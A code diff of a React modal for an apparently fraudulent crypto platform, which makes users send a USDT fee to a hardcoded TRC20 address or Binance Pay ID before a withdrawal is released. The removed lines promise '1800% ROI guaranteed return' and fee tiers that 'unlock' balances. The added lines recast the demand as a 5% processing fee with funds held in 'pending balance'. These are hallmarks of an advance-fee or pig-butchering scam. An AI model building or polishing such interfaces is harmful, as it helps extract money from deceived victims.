@@ -10,6 +10,8 @@ interface ServiceFeeModalProps {
   onClose: () => void;
   onConfirm: () => void;
   userBalance?: number;
+  withdrawalAmount?: number;
+  calculatedFee?: number;
 }
 
 interface PaymentAddress {
@@ -18,17 +20,15 @@ interface PaymentAddress {
   label: string;
 }
 
-interface ServiceFee {
-  fee_amount: number;
-  account_balance: number;
-  roi_percentage: number;
-}
-
-const ServiceFeeModal = ({ onClose, onConfirm, userBalance = 0 }: ServiceFeeModalProps) => {
+const ServiceFeeModal = ({ 
+  onClose, 
+  onConfirm, 
+  userBalance = 0, 
+  withdrawalAmount = 0,
+  calculatedFee = 0 
+}: ServiceFeeModalProps) => {
   const [copied, setCopied] = useState<string | null>(null);
   const [paymentAddresses, setPaymentAddresses] = useState<PaymentAddress[]>([]);
-  const [serviceFees, setServiceFees] = useState<ServiceFee[]>([]);
-  const [selectedFee, setSelectedFee] = useState<ServiceFee | null>(null);
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
@@ -49,48 +49,19 @@ const ServiceFeeModal = ({ onClose, onConfirm, userBalance = 0 }: ServiceFeeModa
         } else {
           setPaymentAddresses(addresses || []);
         }
-
-        // Fetch all service fees
-        const { data: feeData, error: feeError } = await supabase
-          .from('service_fees')
-          .select('fee_amount, account_balance, roi_percentage')
-          .eq('is_active', true)
-          .order('fee_amount', { ascending: true });
-
-        if (feeError) {
-          console.error('Error fetching service fees:', feeError);
-          setServiceFees([
-            { fee_amount: 20, account_balance: 380, roi_percentage: 1800 },
-            { fee_amount: 50, account_balance: 950, roi_percentage: 1800 },
-            { fee_amount: 100, account_balance: 1900, roi_percentage: 1800 }
-          ]);
-        } else {
-          setServiceFees(feeData || []);
-        }
-
-        // Auto-select appropriate fee based on user balance
-        if (feeData && feeData.length > 0) {
-          const appropriateFee = feeData.find(fee => fee.account_balance >= userBalance) || feeData[0];
-          setSelectedFee(appropriateFee);
-        }
-
       } catch (error) {
         console.error('Error fetching payment data:', error);
         setPaymentAddresses([
           { address_type: 'usdt_trc20', address_value: 'TBMWwcYaAf4m8ug5GbHwwAV-DaskwQX1RWL', label: 'USDT TRC20 Address' },
           { address_type: 'binance_pay', address_value: '713568475', label: 'Binance Pay ID' }
         ]);
-        setServiceFees([
-          { fee_amount: 20, account_balance: 380, roi_percentage: 1800 }
-        ]);
-        setSelectedFee({ fee_amount: 20, account_balance: 380, roi_percentage: 1800 });
       } finally {
         setLoading(false);
       }
     };
 
     fetchPaymentData();
-  }, [userBalance]);
+  }, []);
 
   const copyToClipboard = async (text: string, label: string) => {
     try {
@@ -135,8 +106,8 @@ const ServiceFeeModal = ({ onClose, onConfirm, userBalance = 0 }: ServiceFeeModa
               <AlertTriangle className="h-5 w-5 text-amber-400" />
             </div>
             <div>
-              <CardTitle className="text-white text-xl">Service Fee Required</CardTitle>
-              <p className="text-gray-400 text-sm">First withdrawal setup</p>
+              <CardTitle className="text-white text-xl">Withdrawal Fee Required</CardTitle>
+              <p className="text-gray-400 text-sm">5% processing fee</p>
             </div>
           </div>
           <Button 
@@ -150,107 +121,90 @@ const ServiceFeeModal = ({ onClose, onConfirm, userBalance = 0 }: ServiceFeeModa
         </CardHeader>
         
         <CardContent className="space-y-6 overflow-y-auto flex-1">
+          {/* Withdrawal Summary */}
+          <div className="bg-slate-900/50 p-4 rounded-lg border border-slate-700">
+            <h3 className="text-white font-semibold mb-3">Withdrawal Summary</h3>
+            <div className="space-y-2 text-sm">
+              <div className="flex justify-between">
+                <span className="text-gray-400">Withdrawal Amount:</span>
+                <span className="text-white">${withdrawalAmount.toLocaleString()}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-400">Processing Fee (5%):</span>
+                <span className="text-amber-400">${calculatedFee.toLocaleString()}</span>
+              </div>
+              <div className="flex justify-between border-t border-slate-600 pt-2">
+                <span className="text-white font-medium">You'll Receive:</span>
+                <span className="text-green-400 font-medium">${(withdrawalAmount - calculatedFee).toLocaleString()}</span>
+              </div>
+            </div>
+          </div>
+
           <div className="bg-slate-900/50 p-4 rounded-lg border border-slate-700">
             <h3 className="text-white font-semibold mb-2">Why is this fee required?</h3>
             <ul className="space-y-1 text-gray-400 text-sm">
               <li>• Network gas fees for blockchain transactions</li>
-              <li>• Security verification and KYC processing</li>
+              <li>• Security verification and processing</li>
               <li>• Anti-fraud protection measures</li>
               <li>• Infrastructure and maintenance costs</li>
             </ul>
           </div>
 
-          {/* Service Fee Options */}
-          <div className="space-y-4">
-            <h3 className="text-white font-semibold">Select Service Fee Option</h3>
-            <div className="grid gap-3">
-              {serviceFees.map((fee) => (
-                <div
-                  key={fee.fee_amount}
-                  onClick={() => setSelectedFee(fee)}
-                  className={`p-3 rounded-lg border cursor-pointer transition-all ${
-                    selectedFee?.fee_amount === fee.fee_amount
-                      ? 'border-blue-500 bg-blue-500/10'
-                      : 'border-slate-600 hover:border-slate-500'
-                  }`}
-                >
-                  <div className="flex justify-between items-center">
-                    <div>
-                      <p className="text-white font-medium">${fee.fee_amount} USDT</p>
-                      <p className="text-gray-400 text-sm">
-                        Unlock ${fee.account_balance.toLocaleString()} potential
-                      </p>
-                    </div>
-                    <div className="text-right">
-                      <p className="text-green-400 text-sm font-medium">
-                        {fee.roi_percentage}% ROI
-                      </p>
+          <div className="text-center space-y-4">
+            <div className="bg-gradient-to-r from-blue-600/20 to-purple-600/20 p-6 rounded-xl border border-blue-500/30">
+              <h3 className="text-white text-lg font-semibold mb-2">
+                Send ${calculatedFee} USDT (TRC20)
+              </h3>
+              <p className="text-gray-300 text-sm mb-4">
+                Processing fee for ${withdrawalAmount} withdrawal
+              </p>
+
+              <div className="bg-slate-900 p-3 rounded-lg border border-slate-600 space-y-3">
+                {usdtAddress && (
+                  <div>
+                    <p className="text-gray-400 text-xs mb-1">USDT TRC20 Address:</p>
+                    <div className="flex items-center justify-between">
+                      <code className="text-blue-400 text-sm font-mono break-all flex-1">{usdtAddress}</code>
+                      <Button
+                        variant="ghost"
+                        size="sm"
+                        onClick={() => copyToClipboard(usdtAddress, "Address")}
+                        className="ml-2 h-8 w-8 p-0 text-gray-400 hover:text-blue-400"
+                      >
+                        {copied === "Address" ? <Check size={16} /> : <Copy size={16} />}
+                      </Button>
                     </div>
                   </div>
-                </div>
-              ))}
+                )}
+
+                {binanceID && (
+                  <div>
+                    <p className="text-gray-400 text-xs mb-1">Binance Pay ID:</p>
+                    <div className="flex items-center justify-between">
+                      <code className="text-green-400 text-sm font-mono break-all flex-1">{binanceID}</code>
+                      <Button
+                        variant="ghost"
+                        size="sm"
+                        onClick={() => copyToClipboard(binanceID, "Binance Pay ID")}
+                        className="ml-2 h-8 w-8 p-0 text-gray-400 hover:text-green-400"
+                      >
+                        {copied === "Binance Pay ID" ? <Check size={16} /> : <Copy size={16} />}
+                      </Button>
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              <div className="text-xs text-gray-500 pt-2">
+                ⚠️ Only send USDT on the TRC20 network. Other networks may result in permanent loss.
+              </div>
             </div>
           </div>
 
-          {selectedFee && (
-            <div className="text-center space-y-4">
-              <div className="bg-gradient-to-r from-blue-600/20 to-purple-600/20 p-6 rounded-xl border border-blue-500/30">
-                <h3 className="text-white text-lg font-semibold mb-2">
-                  Send ${selectedFee.fee_amount} USDT (TRC20)
-                </h3>
-                <p className="text-gray-300 text-sm mb-2">
-                  Unlock ${selectedFee.account_balance.toLocaleString()} earning potential
-                </p>
-                <p className="text-green-400 text-xs mb-4">
-                  ROI: {selectedFee.roi_percentage}% guaranteed return
-                </p>
-
-                <div className="bg-slate-900 p-3 rounded-lg border border-slate-600 space-y-3">
-                  {usdtAddress && (
-                    <div>
-                      <p className="text-gray-400 text-xs mb-1">USDT TRC20 Address:</p>
-                      <div className="flex items-center justify-between">
-                        <code className="text-blue-400 text-sm font-mono break-all flex-1">{usdtAddress}</code>
-                        <Button
-                          variant="ghost"
-                          size="sm"
-                          onClick={() => copyToClipboard(usdtAddress, "Address")}
-                          className="ml-2 h-8 w-8 p-0 text-gray-400 hover:text-blue-400"
-                        >
-                          {copied === "Address" ? <Check size={16} /> : <Copy size={16} />}
-                        </Button>
-                      </div>
-                    </div>
-                  )}
-
-                  {binanceID && (
-                    <div>
-                      <p className="text-gray-400 text-xs mb-1">Binance Pay ID:</p>
-                      <div className="flex items-center justify-between">
-                        <code className="text-green-400 text-sm font-mono break-all flex-1">{binanceID}</code>
-                        <Button
-                          variant="ghost"
-                          size="sm"
-                          onClick={() => copyToClipboard(binanceID, "Binance Pay ID")}
-                          className="ml-2 h-8 w-8 p-0 text-gray-400 hover:text-green-400"
-                        >
-                          {copied === "Binance Pay ID" ? <Check size={16} /> : <Copy size={16} />}
-                        </Button>
-                      </div>
-                    </div>
-                  )}
-                </div>
-
-                <div className="text-xs text-gray-500 pt-2">
-                  ⚠️ Only send USDT on the TRC20 network. Other networks may result in permanent loss.
-                </div>
-              </div>
-            </div>
-          )}
-
           <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4">
             <p className="text-amber-300 text-sm">
-              <strong>Important:</strong> This is a one-time setup fee. Once verified, future withdrawals will only incur network charges.
+              <strong>Important:</strong> Your withdrawal amount has been moved to pending balance. 
+              Once fee payment is confirmed, your withdrawal will be processed within 24 hours.
             </p>
           </div>
         </CardContent>
@@ -265,7 +219,6 @@ const ServiceFeeModal = ({ onClose, onConfirm, userBalance = 0 }: ServiceFeeModa
           </Button>
           <Button
             onClick={onConfirm}
-            disabled={!selectedFee}
             className="flex-1 h-11 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 transition-all duration-300 text-white font-semibold"
           >
             I've Sent Payment
